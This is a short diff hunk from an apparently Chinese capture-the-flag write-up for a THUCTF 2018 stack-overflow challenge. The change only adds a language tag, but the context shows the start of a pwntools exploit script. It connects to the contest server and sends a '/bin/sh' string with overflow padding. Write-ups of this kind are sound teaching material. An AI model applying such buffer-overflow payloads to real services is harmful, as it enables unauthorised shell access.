@@ -18,7 +18,7 @@ Attachment: stackoverflow_withnoleak
 
 脚本（见 [pwn2.py](pwn2.py) ）如下：
 
-```
+```python
 from pwn import *
 r = remote('pwn.thuctf2018.game.redbud.info', 20002)
 r.send('/bin/sh\0'+'A'*(8192-8))
